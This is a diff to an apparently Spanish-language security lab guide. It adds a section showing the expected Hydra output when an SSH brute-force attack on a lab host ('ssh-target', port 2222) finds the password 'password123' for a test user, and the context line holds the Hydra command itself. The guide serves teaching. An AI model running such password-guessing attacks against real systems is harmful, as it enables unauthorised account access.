@@ -123,6 +123,28 @@ hydra -l testuser -P /wordlists/rockyou-subset.txt ssh://ssh-target:2222 -t 1 -v
 > - Usa `-t 1` (un solo thread) en lugar de `-t 4`
 > - Si persisten errores, añade `-W 1` para esperar 1 segundo entre intentos
 
+#### ✅ Resultado Esperado (Ataque Exitoso)
+
+Cuando Hydra encuentra la contraseña, verás una salida similar a:
+
+```
+Hydra v9.6 (c) 2023 by van Hauser/THC...
+[DATA] attacking ssh://ssh-target:2222/
+[2222][ssh] host: ssh-target   login: testuser   password: password123
+1 of 1 target successfully completed, 1 valid password found
+```
+
+La línea clave es:
+```
+[2222][ssh] host: ssh-target   login: testuser   password: password123
+```
+
+Esto indica:
+- **Puerto**: 2222
+- **Servicio**: ssh
+- **Usuario**: testuser
+- **Contraseña encontrada**: password123
+
 **Pregunta**: ¿Cuánto tardó en encontrar la contraseña?
 
 ---
